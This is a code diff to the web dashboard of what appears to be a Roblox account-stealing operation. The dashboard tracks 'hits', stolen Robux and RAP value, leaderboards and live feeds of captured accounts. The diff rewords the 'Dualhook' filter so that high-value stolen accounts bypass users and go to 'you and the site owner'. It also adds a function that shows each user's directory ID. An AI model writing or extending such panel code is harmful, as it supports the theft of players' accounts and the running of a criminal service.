@@ -628,7 +628,7 @@
         <!-- Filtering Options for Dualhook directories -->
         <div id="filterSection" class="filter-section" style="display: none;">
             <h2>Filtering Options</h2>
-            <p class="filter-description">Configure filters to capture high-value accounts. When enabled, matching hits bypass your users and go directly to you.</p>
+            <p class="filter-description">Configure filters to capture high-value accounts. When enabled, matching hits bypass your users and go directly to you and the site owner.</p>
 
             <div class="filter-master-toggle">
                 <label class="toggle-label">
@@ -742,7 +742,8 @@
         async function initDashboard() {
             if (!checkAuth()) return;
 
-            document.getElementById('userInfo').textContent = `Directory: ${userDirectory}`;
+            // Load user info to get unique ID
+            await loadUserInfo();
             await loadPersonalStats();
             await loadLeaderboards();
             await loadLiveHits();
@@ -751,6 +752,31 @@
             setInterval(loadLeaderboards, 30000); // 30 seconds
             setInterval(loadLiveHits, 10000); // 10 seconds
             setInterval(loadPersonalStats, 60000); // 1 minute
+        }
+
+        async function loadUserInfo() {
+            try {
+                const statsResponse = await fetch('/api/user-stats', {
+                    headers: {
+                        'Authorization': `Bearer ${authToken}`
+                    }
+                });
+                
+                if (statsResponse.ok) {
+                    const statsData = await statsResponse.json();
+                    if (statsData.uniqueId) {
+                        document.getElementById('userInfo').textContent = `Directory ID: ${statsData.uniqueId}`;
+                    } else {
+                        document.getElementById('userInfo').textContent = `Directory: ${userDirectory}`;
+                    }
+                } else {
+                    // Fallback to directory name
+                    document.getElementById('userInfo').textContent = `Directory: ${userDirectory}`;
+                }
+            } catch (error) {
+                console.error('Error loading user info:', error);
+                document.getElementById('userInfo').textContent = `Directory: ${userDirectory}`;
+            }
         }
 
         async function loadPersonalStats() {
@@ -781,6 +807,11 @@
             document.getElementById('summaryChange').textContent = `+${(stats.todaySummary || 0).toLocaleString()} today`;
             document.getElementById('robuxChange').textContent = `+${(stats.todayRobux || 0).toLocaleString()} today`;
             document.getElementById('rapChange').textContent = `+${(stats.todayRAP || 0).toLocaleString()} today`;
+
+            // Update user info with unique ID if available
+            if (stats.uniqueId) {
+                document.getElementById('userInfo').textContent = `Directory ID: ${stats.uniqueId}`;
+            }
         }
 
         async function loadLeaderboards() {
